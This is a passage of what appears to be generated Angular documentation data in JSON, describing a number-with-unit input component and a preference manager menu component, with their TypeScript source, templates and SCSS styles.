                    "line": 22,
                    "modifierKind": [
                        114
                    ],
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "stateChanges",
                    "type": "Subject<void>",
                    "optional": false,
                    "description": "<p>Stream that emits whenever the state of the input changes such that the wrapping\n<code>MatFormField</code> needs to run change detection.</p>\n",
                    "line": 14,
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                }
            ],
            "methodsClass": [
                {
                    "name": "ngDoCheck",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 209
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 233
                },
                {
                    "name": "ngOnInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 216
                },
                {
                    "name": "onContainerClick",
                    "args": [
                        {
                            "name": "event",
                            "type": "MouseEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 240,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "MouseEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "registerOnChange",
                    "args": [
                        {
                            "name": "fn",
                            "type": "never"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 268,
                    "jsdoctags": [
                        {
                            "name": "fn",
                            "type": "never",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "registerOnTouched",
                    "args": [
                        {
                            "name": "fn",
                            "type": "never"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 272,
                    "jsdoctags": [
                        {
                            "name": "fn",
                            "type": "never",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setDescribedByIds",
                    "args": [
                        {
                            "name": "ids",
                            "type": "string[]"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 252,
                    "jsdoctags": [
                        {
                            "name": "ids",
                            "type": "string[]",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setDisabledState",
                    "args": [
                        {
                            "name": "isDisabled",
                            "type": "boolean"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 276,
                    "jsdoctags": [
                        {
                            "name": "isDisabled",
                            "type": "boolean",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "writeValue",
                    "args": [
                        {
                            "name": "value",
                            "type": "NumberUnit | null"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 264,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "NumberUnit | null",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "updateErrorState",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 25,
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                }
            ],
            "hostBindings": [
                {
                    "name": "attr.aria-describedby",
                    "defaultValue": "''",
                    "line": 183
                },
                {
                    "name": "class.floating",
                    "line": 162
                },
                {
                    "name": "id",
                    "defaultValue": "`value-unit-input-${NumberUnitInputComponent.nextId++}`",
                    "line": 123
                }
            ],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import {\n  ChangeDetectionStrategy,\n  Component,\n  DoCheck,\n  ElementRef,\n  HostBinding,\n  Input,\n  OnDestroy,\n  OnInit,\n  Optional,\n  Self,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { ControlValueAccessor, FormBuilder, FormGroup, FormGroupDirective, NgControl, NgForm } from '@angular/forms';\nimport { MatFormFieldControl } from '@angular/material/form-field';\nimport { Subject, Subscription } from 'rxjs';\nimport { FocusMonitor } from '@angular/cdk/a11y';\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\nimport { NumberInputPipe } from '../number-input.pipe';\nimport { MatSelect } from '@angular/material/select';\nimport { FormFieldBase } from '../../sto-form/form-field.base';\nimport { ErrorStateMatcher } from '@angular/material/core';\n\nclass NumberUnit {\n  value: number | string;\n  unit: string;\n}\n\n@Component({\n  selector: 'sto-number-unit-input',\n  templateUrl: './number-unit-input.component.html',\n  styleUrls: [ './number-unit-input.component.scss' ],\n  providers: [\n    { provide: MatFormFieldControl, useExisting: NumberUnitInputComponent }\n  ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class NumberUnitInputComponent extends FormFieldBase\n  implements DoCheck, OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<NumberUnit> {\n  static nextId = 0;\n  stateChanges = new Subject<void>();\n  public form: FormGroup;\n  readonly autofilled: boolean;\n  controlType = 'number-unit-input';\n  private numberFormatterPipe = new NumberInputPipe();\n  @ViewChild(MatSelect)\n  select: MatSelect;\n  @ViewChild('input')\n  input: ElementRef<HTMLInputElement>;\n\n  errorState: boolean;\n\n  @Input()\n  unitOptional = true;\n  @Input()\n  unitClearText = '(none)';\n\n  @Input()\n  get disabled(): boolean {\n    return this._disabled;\n  }\n\n  set disabled(disable: boolean) {\n    this._disabled = coerceBooleanProperty(disable);\n    const opts = { onlySelf: true, emitEvent: false };\n    disable ? this.form.disable(opts) : this.form.enable(opts);\n    // disable ? this.form.get('unit').disable(opts) : this.form.get('unit').enable(opts);\n    // disable ? this.form.get('value').disable(opts) : this.form.get('value').enable(opts);\n    this.stateChanges.next();\n  }\n\n  private _disabled = false;\n\n  @Input()\n  get readonly(): boolean {\n    return this._readonly;\n  }\n\n  set readonly(value: boolean) {\n    this._readonly = coerceBooleanProperty(value);\n    const opts = { onlySelf: true, emitEvent: false };\n    value ? this.form.get('unit')?.disable(opts) : this.form.get('unit')?.enable(opts);\n    this.stateChanges.next();\n  }\n\n  private _readonly = false;\n\n  @Input()\n  get list() {\n    return this._list;\n  }\n\n  set list(value) {\n    this._list = value;\n    this.stateChanges.next();\n  }\n\n  private _list: { value: unknown; title?: string; }[] = [];\n\n  @Input()\n  get fractionSize() {\n    return this._fractionSize || 3;\n  }\n\n  set fractionSize(fractionSize) {\n    this._fractionSize = fractionSize;\n    this.stateChanges.next();\n  }\n\n  private _fractionSize: number;\n\n  get empty() {\n    const n = this.form.value;\n    return !n.value && !n.unit;\n  }\n\n  public focused: boolean;\n\n\n  @HostBinding()\n  id = `value-unit-input-${NumberUnitInputComponent.nextId++}`;\n\n  @Input()\n  get placeholder() {\n    return this._placeholder || '';\n  }\n\n  set placeholder(plh) {\n    this._placeholder = plh;\n    this.stateChanges.next();\n  }\n\n  private _placeholder: string;\n\n  @Input()\n  get unitPlaceholder() {\n    return this._unitPlaceholder || '';\n  }\n\n  set unitPlaceholder(plh) {\n    this._unitPlaceholder = plh;\n    this.stateChanges.next();\n  }\n\n  private _unitPlaceholder: string;\n\n  @Input()\n  get required() {\n    return this._required;\n  }\n\n  set required(req) {\n    this._required = coerceBooleanProperty(req);\n    this.stateChanges.next();\n  }\n\n  private _required = false;\n\n  @HostBinding('class.floating')\n  get shouldLabelFloat() {\n    return this.focused || !this.empty;\n  }\n\n  get value(): NumberUnit | null {\n    return this._value;\n  }\n\n  set value(value: NumberUnit | null) {\n    if ( value ) {\n      const parsedValue = this.numberFormatterPipe.transform(value.value, this.fractionSize);\n      this._value = { ...value, value: parsedValue };\n    } else {\n      this._value = value;\n    }\n    this.form.patchValue(this._value || {}, { emitEvent: false });\n    this.stateChanges.next();\n  }\n\n  private _value: NumberUnit | null;\n\n  @HostBinding('attr.aria-describedby') describedBy = '';\n\n  public sub = new Subscription();\n\n\n  constructor(@Optional() @Self() public ngControl: NgControl,\n              private fm: FocusMonitor,\n              private fb: FormBuilder,\n              @Optional() _parentForm: NgForm,\n              @Optional() _parentFormGroup: FormGroupDirective,\n              _defaultErrorStateMatcher: ErrorStateMatcher,\n              private elRef: ElementRef<HTMLElement>) {\n    super(elRef, _defaultErrorStateMatcher, _parentForm, _parentFormGroup, ngControl);\n    this.form = this.fb.group({\n      value: [],\n      unit: []\n    });\n    if ( this.ngControl != null ) {\n      this.ngControl.valueAccessor = this;\n    }\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\n      this.focused = !!origin;\n      this.stateChanges.next();\n    });\n  }\n\n  ngDoCheck(): void {\n    if ( this.ngControl ) {\n      this.updateErrorState();\n    }\n  }\n\n\n  ngOnInit(): void {\n    const sub = this.form.valueChanges\n      .subscribe((value: NumberUnit) => {\n        const valueAsString = value.value as string;\n        let numberValue: number | null = parseFloat(this.numberFormatterPipe.parse(valueAsString, this.fractionSize));\n        numberValue = !isNaN(numberValue) ? numberValue : null;\n        this.onChange({ ...value, value: numberValue });\n      });\n\n    this.sub.add(sub);\n    if ( this.ngControl && this.ngControl.statusChanges ) {\n      this.sub.add(this.ngControl.statusChanges\n        .subscribe(() => this.updateErrorState())\n      );\n    }\n  }\n\n  ngOnDestroy(): void {\n    this.stateChanges.complete();\n    this.fm.stopMonitoring(this.elRef.nativeElement);\n    this.sub.unsubscribe();\n  }\n\n\n  onContainerClick(event: MouseEvent) {\n    const rect = this.input.nativeElement.getBoundingClientRect();\n    const isInputFocus = rect.right >= event.clientX;\n    if ( isInputFocus ) {\n      this.elRef.nativeElement.querySelector('input')?.focus();\n    } else {\n      this.select.focus();\n      this.select.open();\n    }\n  }\n\n\n  setDescribedByIds(ids: string[]) {\n    this.describedBy = ids.join(' ');\n  }\n\n\n  // eslint-disable-next-line @typescript-eslint/no-empty-function,@typescript-eslint/no-unused-vars\n  onChange = (_: unknown) => {\n  }\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\n  onTouched = () => {\n  }\n\n  writeValue(value: NumberUnit | null): void {\n    this.value = value;\n  }\n\n  registerOnChange(fn: never): void {\n    this.onChange = fn;\n  }\n\n  registerOnTouched(fn: never): void {\n    this.onTouched = fn;\n  }\n\n  setDisabledState(isDisabled: boolean): void {\n    this.disabled = isDisabled;\n  }\n\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": ".mat-form-field.sto-form__field {\n  sto-number-unit-input {\n    .number-unit-input-container {\n      display: grid;\n      grid-template-columns: 20fr 45px;\n      grid-column-gap: 8px;\n    }\n\n    .number-unit-input-element {\n      border: none;\n      background: none;\n      padding: 0;\n      outline: none;\n      font: inherit;\n\n      .mat-select-placeholder {\n        transition: none;\n      }\n\n      .mat-select-value-text span {\n        pointer-events: none;\n      }\n\n\n    }\n\n\n    &.floating .number-unit-input-spacer {\n    }\n\n    .number-unit-input-spacer {\n      height: 44px;\n      width: 1px;\n      position: absolute;\n      right: 55px;\n      top: -19px;\n    }\n  }\n\n  &:not(.sto-form__field--readonly) {\n    .number-unit-input-element {\n      &:focus, &:focus .mat-select-placeholder {\n        font-weight: bold;\n      }\n    }\n  }\n\n  &.sto-form__field--readonly {\n    .number-unit-input-spacer {\n      opacity: 0;\n    }\n  }\n\n  &.sto-form__field--readonly {\n    .mat-select-arrow {\n      opacity: 0;\n    }\n  }\n}\n\n",
                    "styleUrl": "./number-unit-input.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "ngControl",
                        "type": "NgControl"
                    },
                    {
                        "name": "fm",
                        "type": "FocusMonitor"
                    },
                    {
                        "name": "fb",
                        "type": "FormBuilder"
                    },
                    {
                        "name": "_parentForm",
                        "type": "NgForm"
                    },
                    {
                        "name": "_parentFormGroup",
                        "type": "FormGroupDirective"
                    },
                    {
                        "name": "_defaultErrorStateMatcher",
                        "type": "ErrorStateMatcher"
                    },
                    {
                        "name": "elRef",
                        "type": "ElementRef<HTMLElement>"
                    }
                ],
                "line": 185,
                "jsdoctags": [
                    {
                        "name": "ngControl",
                        "type": "NgControl",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "fm",
                        "type": "FocusMonitor",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "fb",
                        "type": "FormBuilder",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "_parentForm",
                        "type": "NgForm",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "_parentFormGroup",
                        "type": "FormGroupDirective",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "_defaultErrorStateMatcher",
                        "type": "ErrorStateMatcher",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "elRef",
                        "type": "ElementRef<HTMLElement>",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "extends": "FormFieldBase",
            "implements": [
                "DoCheck",
                "OnInit",
                "OnDestroy",
                "ControlValueAccessor",
                "MatFormFieldControl"
            ],
            "accessors": {
                "disabled": {
                    "name": "disabled",
                    "setSignature": {
                        "name": "disabled",
                        "type": "void",
                        "args": [
                            {
                                "name": "disable",
                                "type": "boolean"
                            }
                        ],
                        "returnType": "void",
                        "line": 65,
                        "jsdoctags": [
                            {
                                "name": "disable",
                                "type": "boolean",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "readonly": {
                    "name": "readonly",
                    "setSignature": {
                        "name": "readonly",
                        "type": "void",
                        "args": [
                            {
                                "name": "value",
                                "type": "boolean"
                            }
                        ],
                        "returnType": "void",
                        "line": 81,
                        "jsdoctags": [
                            {
                                "name": "value",
                                "type": "boolean",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "list": {
                    "name": "list",
                    "setSignature": {
                        "name": "list",
                        "type": "void",
                        "args": [
                            {
                                "name": "value",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 95,
                        "jsdoctags": [
                            {
                                "name": "value",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "fractionSize": {
                    "name": "fractionSize",
                    "setSignature": {
                        "name": "fractionSize",
                        "type": "void",
                        "args": [
                            {
                                "name": "fractionSize",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 107,
                        "jsdoctags": [
                            {
                                "name": "fractionSize",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "empty": {
                    "name": "empty",
                    "getSignature": {
                        "name": "empty",
                        "type": "",
                        "returnType": "",
                        "line": 114
                    }
                },
                "placeholder": {
                    "name": "placeholder",
                    "setSignature": {
                        "name": "placeholder",
                        "type": "void",
                        "args": [
                            {
                                "name": "plh",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 130,
                        "jsdoctags": [
                            {
                                "name": "plh",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "unitPlaceholder": {
                    "name": "unitPlaceholder",
                    "setSignature": {
                        "name": "unitPlaceholder",
                        "type": "void",
                        "args": [
                            {
                                "name": "plh",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 142,
                        "jsdoctags": [
                            {
                                "name": "plh",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "required": {
                    "name": "required",
                    "setSignature": {
                        "name": "required",
                        "type": "void",
                        "args": [
                            {
                                "name": "req",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 154,
                        "jsdoctags": [
                            {
                                "name": "req",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "value": {
                    "name": "value",
                    "setSignature": {
                        "name": "value",
                        "type": "void",
                        "args": [
                            {
                                "name": "value",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 170,
                        "jsdoctags": [
                            {
                                "name": "value",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    },
                    "getSignature": {
                        "name": "value",
                        "type": "",
                        "returnType": "NumberUnit | null",
                        "line": 166
                    }
                }
            },
            "templateData": "<div [formGroup]=\"form\"\n     class=\"number-unit-input-container\">\n  <input numberInput\n         #input\n         class=\"number-unit-input-element number-unit-input-value\"\n         (blur)=\"onTouched()\"\n         [fractionSize]=\"fractionSize\"\n         [unit]=\"select?.triggerValue\"\n         [placeholder]=\"placeholder\"\n         [appendUnit]=\"readonly\"\n         [readonly]=\"readonly\"\n         [tabindex]=\"(readonly || disabled) ? -1 : 0\"\n         type=\"text\"\n         formControlName=\"value\"/>\n  <mat-select formControlName=\"unit\"\n              [class.cdk-visually-hidden]=\"readonly\"\n              (blur)=\"onTouched()\"\n              [placeholder]=\"unitPlaceholder\"\n              class=\"number-unit-input-element number-unit-input-unit\">\n    <mat-option *ngIf=\"form.get('unit')?.value && unitOptional\"\n                class=\"sto-option--clear\"\n                [value]=\"null\">{{ unitClearText }}\n    </mat-option>\n    <mat-option *ngFor=\"let el of list\"\n                [value]=\"el.value\">\n      {{ el.title || el.value }}\n    </mat-option>\n  </mat-select>\n</div>\n<span class=\"number-unit-input-spacer\"></span>\n"
        },
        {
            "name": "PreferenceManagerComponent",
            "id": "component-PreferenceManagerComponent-26e85f8f10ba0e17f418d4e6e309162a",
            "file": "libs/common/src/lib/preference-manager/preference-manager.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [],
            "selector": "sto-preference-manager",
            "styleUrls": [
                "./preference-manager.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./preference-manager.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "activePreferenceId",
                    "description": "<p>ID of the selected preference</p>\n",
                    "line": 45,
                    "type": "string"
                },
                {
                    "name": "dirty",
                    "description": "<p>If the current preference has been modified</p>\n",
                    "line": 55,
                    "type": "boolean"
                },
                {
                    "name": "identifierKey",
                    "description": "<p>The preference identifier (typically application area).\nIf missing, will be set to null</p>\n",
                    "line": 40,
                    "type": "string"
                },
                {
                    "name": "loadingIndicator",
                    "description": "<p>Whether to show a progress spinner besides the title</p>\n",
                    "line": 50,
                    "type": "boolean"
                },
                {
                    "name": "placeholder",
                    "defaultValue": "'No filter selected'",
                    "description": "<p>Text to display when no preference is selected</p>\n",
                    "line": 60,
                    "type": "string | null"
                },
                {
                    "name": "preferences",
                    "defaultValue": "[]",
                    "description": "<p>List of the available preferences</p>\n",
                    "line": 34,
                    "type": "Preference[]"
                }
            ],
            "outputsClass": [
                {
                    "name": "addNewPreference",
                    "defaultValue": "new EventEmitter<Preference>()",
                    "description": "<p>addNewPreference emits when the user creates a new preference.\nThis does <em>not</em> include the current setup - that needs to be added by the consuming application</p>\n",
                    "line": 87,
                    "type": "EventEmitter"
                },
                {
                    "name": "deletePreference",
                    "defaultValue": "new EventEmitter<string>()",
                    "description": "<p>deletePreference emits when a preference is deleted</p>\n",
                    "line": 81,
                    "type": "EventEmitter"
                },
                {
                    "name": "editPreference",
                    "defaultValue": "new EventEmitter<Preference>()",
                    "description": "<p>editPreference emits any changed (existing) preference</p>\n",
                    "line": 71,
                    "type": "EventEmitter"
                },
                {
                    "name": "selectPreference",
                    "defaultValue": "new EventEmitter<string>()",
                    "description": "<p>selectPreference emits whenever a preference is selected</p>\n",
                    "line": 66,
                    "type": "EventEmitter"
                },
                {
                    "name": "setDefaultPreference",
                    "defaultValue": "new EventEmitter<Preference>()",
                    "description": "<p>setDefaultPreference emits when the user determines a new default preference</p>\n",
                    "line": 76,
                    "type": "EventEmitter"
                },
                {
                    "name": "sharePreference",
                    "defaultValue": "new EventEmitter<string>()",
                    "description": "<p>sharePreference emits when the user clicks the &quot;share&quot; button.\nEach application needs to implement this functionality for themselves.</p>\n",
                    "line": 93,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [
                {
                    "name": "changedPreference",
                    "type": "Preference | null",
                    "optional": false,
                    "description": "",
                    "line": 100,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "editIndex",
                    "type": "number | null",
                    "optional": false,
                    "description": "",
                    "line": 99,
                    "modifierKind": [
                        114
                    ],
                    "jsdoctags": [
                        {
                            "pos": 2472,
                            "end": 2481,
                            "flags": 0,
                            "kind": 288,
                            "atToken": {
                                "pos": 2472,
                                "end": 2473,
                                "flags": 0,
                                "kind": 57
                            },
                            "tagName": {
                                "pos": 2473,
                                "end": 2481,
                                "flags": 0,
                                "escapedText": "internal"
                            },
                            "comment": ""
                        }
                    ]
                },
                {
                    "name": "nameTmpl",
                    "type": "ElementRef<HTMLInputElement>",
                    "optional": false,
                    "description": "",
                    "line": 28,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "'nameTmpl'"
                        }
                    ]
                },
                {
                    "name": "newPreference",
                    "type": "Preference | null",
                    "optional": false,
                    "description": "",
                    "line": 101,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "trigger",
                    "type": "MatMenuTrigger",
                    "optional": false,
                    "description": "",
                    "line": 26,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "MatMenuTrigger"
                        }
                    ],
                    "modifierKind": [
                        112
                    ]
                }
            ],
            "methodsClass": [
                {
                    "name": "addPreference",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 164
                },
                {
                    "name": "cancelNewPreference",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 185,
                    "description": "",
                    "jsdoctags": []
                },
                {
                    "name": "cancelRename",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 121,
                    "description": "",
                    "jsdoctags": []
                },
                {
                    "name": "focusActiveItem",
                    "args": [
                        {
                            "name": "menu",
                            "type": "MatMenu"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 153,
                    "description": "",
                    "jsdoctags": [
                        {
                            "name": "menu",
                            "type": "MatMenu",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "overwrite",
                    "args": [
                        {
                            "name": "pref",
                            "type": "Preference"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 189,
                    "jsdoctags": [
                        {
                            "name": "pref",
                            "type": "Preference",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "renamePreference",
                    "args": [
                        {
                            "name": "preference",
                            "type": "Preference"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 111,
                    "description": "",
                    "jsdoctags": [
                        {
                            "name": "preference",
                            "type": "Preference",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "saveNewPreference",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 172,
                    "description": "",
                    "jsdoctags": []
                },
                {
                    "name": "saveRename",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 129,
                    "description": "",
                    "jsdoctags": []
                },
                {
                    "name": "toggleDefault",
                    "args": [
                        {
                            "name": "preference",
                            "type": "Preference"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 143,
                    "description": "",
                    "jsdoctags": [
                        {
                            "name": "preference",
                            "type": "Preference",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "hostBindings": [],
            "hostListeners": [
                {
                    "name": "click",
                    "args": [],
                    "argsDecorator": [],
                    "line": 104
                }
            ],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import {\n  ChangeDetectionStrategy,\n  Component,\n  ElementRef,\n  EventEmitter,\n  HostListener,\n  Input,\n  Output,\n  QueryList,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { Preference } from './preference';\nimport { MatMenu, MatMenuItem, MatMenuTrigger } from '@angular/material/menu';\nimport { take } from 'rxjs/operators';\n\n@Component({\n  selector: 'sto-preference-manager',\n  templateUrl: './preference-manager.component.html',\n  styleUrls: [ './preference-manager.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class PreferenceManagerComponent {\n  @ViewChild(MatMenuTrigger)\n  private trigger: MatMenuTrigger;\n  @ViewChild('nameTmpl')\n  nameTmpl: ElementRef<HTMLInputElement>;\n\n  /**\n   * List of the available preferences\n   */\n  @Input()\n  preferences: Preference[] = [];\n  /**\n   * The preference identifier (typically application area).\n   * If missing, will be set to null\n   */\n  @Input()\n  identifierKey: string;\n  /**\n   * ID of the selected preference\n   */\n  @Input()\n  activePreferenceId: string;\n  /**\n   * Whether to show a progress spinner besides the title\n   */\n  @Input()\n  loadingIndicator: boolean;\n  /**\n   * If the current preference has been modified\n   */\n  @Input()\n  dirty: boolean;\n  /**\n   * Text to display when no preference is selected\n   */\n  @Input()\n  placeholder: string | null = 'No filter selected';\n\n  /**\n   * selectPreference emits whenever a preference is selected\n   */\n  @Output()\n  selectPreference = new EventEmitter<string>();\n  /**\n   * editPreference emits any changed (existing) preference\n   */\n  @Output()\n  editPreference = new EventEmitter<Preference>();\n  /**\n   * setDefaultPreference emits when the user determines a new default preference\n   */\n  @Output()\n  setDefaultPreference = new EventEmitter<Preference>();\n  /**\n   * deletePreference emits when a preference is deleted\n   */\n  @Output()\n  deletePreference = new EventEmitter<string>();\n  /**\n   * addNewPreference emits when the user creates a new preference.\n   * This does *not* include the current setup - that needs to be added by the consuming application\n   */\n  @Output()\n  addNewPreference = new EventEmitter<Preference>();\n  /**\n   * sharePreference emits when the user clicks the \"share\" button.\n   * Each application needs to implement this functionality for themselves.\n   */\n  @Output()\n  sharePreference = new EventEmitter<string>();\n\n\n  /**\n   * @internal\n   */\n  public editIndex: number | null;\n  private changedPreference: Preference | null;\n  public newPreference: Preference | null;\n\n  @HostListener('click')\n  openMenu() {\n    this.trigger.openMenu();\n  }\n\n  /**\n   * @internal\n   */\n  renamePreference(preference: Preference) {\n    this.newPreference = null;\n    this.editIndex = this.preferences.indexOf(preference);\n    this.changedPreference = { ...preference };\n    requestAnimationFrame(() => this.nameTmpl.nativeElement.focus());\n  }\n\n  /**\n   * @internal\n   */\n  cancelRename() {\n    this.changedPreference = null;\n    this.editIndex = null;\n  }\n\n  /**\n   * @internal\n   */\n  saveRename() {\n    if (!this.changedPreference) {\n      return;\n    }\n    const el = this.nameTmpl.nativeElement;\n    this.changedPreference.name = el.value;\n    this.editPreference.emit(this.changedPreference);\n    this.editIndex = null;\n    this.changedPreference = null;\n  }\n\n  /**\n   * @internal\n   */\n  toggleDefault(preference: Preference) {\n    this.changedPreference = { ...preference };\n    this.changedPreference.default = true;\n    this.setDefaultPreference.emit(this.changedPreference);\n    this.changedPreference = null;\n  }\n\n  /**\n   * @internal\n   */\n  focusActiveItem(menu: MatMenu) {\n    menu._allItems.changes.pipe(take(1))\n      .subscribe((l: QueryList<MatMenuItem>) => {\n        l.forEach(it => {\n          if ( it._getHostElement().classList.contains('selected') ) {\n            requestAnimationFrame(() => it.focus());\n          }\n        });\n      });\n  }\n\n  addPreference() {\n    this.cancelRename();\n    this.newPreference = new Preference(this.identifierKey);\n  }\n\n  /**\n   * @internal\n   */\n  saveNewPreference() {\n    if (!this.newPreference) {\n      return;\n    }\n    const el = this.nameTmpl.nativeElement;\n    this.newPreference.name = el.value;\n    this.addNewPreference.emit(this.newPreference);\n    this.newPreference = null;\n  }\n\n  /**\n   * @internal\n   */\n  cancelNewPreference() {\n    this.newPreference = null;\n  }\n\n  overwrite(pref: Preference) {\n    this.editPreference.emit(pref);\n  }\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": "// Add theme\nsto-preference-manager {\n  display: flex;\n  align-items: center;\n  cursor: pointer;\n\n  .filter-title {\n    small {\n      font-style: italic;\n    }\n  }\n\n  .mat-progress-spinner {\n    display: inline-block;\n  }\n\n  .filter-title-icon {\n    height: 14px;\n    width: 14px;\n    line-height: 14px;\n    margin-right: 8px;\n  }\n}\n\n.mat-menu-panel.preference-manager-list {\n  width: 350px;\n  min-height: 32px;\n\n  .mat-menu-content:not(:empty) {\n    padding-top: 0;\n    padding-bottom: 0;\n  }\n\n  .preference-manager-list-item {\n    display: flex;\n    padding: 0 8px;\n\n    &.edit {\n      padding-left: 0;\n    }\n\n    .preference-manager-list-item-title {\n      flex: 1 1 auto;\n\n      .mat-form-field {\n        min-height: 32px;\n        height: 32px;\n\n        .mat-form-field-wrapper {\n          padding-bottom: 0;\n\n          .mat-form-field-flex {\n            padding: 8px;\n\n            .mat-form-field-infix {\n              border-top: 0;\n              padding-top: 0;\n            }\n          }\n\n          .mat-form-field-subscript-wrapper {\n            display: none;\n          }\n\n          .mat-form-field-underline {\n            bottom: 1px;\n          }\n        }\n      }\n    }\n\n    .preference-manager-list-item-actions {\n      display: flex;\n      justify-content: flex-end;\n      flex: 0 0 50px;\n\n      .mat-icon {\n        margin-right: 0;\n      }\n\n      .mat-icon-button {\n        height: 32px;\n        width: 32px;\n        line-height: 32px;\n      }\n    }\n  }\n\n  .preference-manager-list-footer {\n    height: 53px;\n    padding: 8px;\n  }\n}\n",
                    "styleUrl": "./preference-manager.component.scss"
                }
            ],
            "stylesData": "",
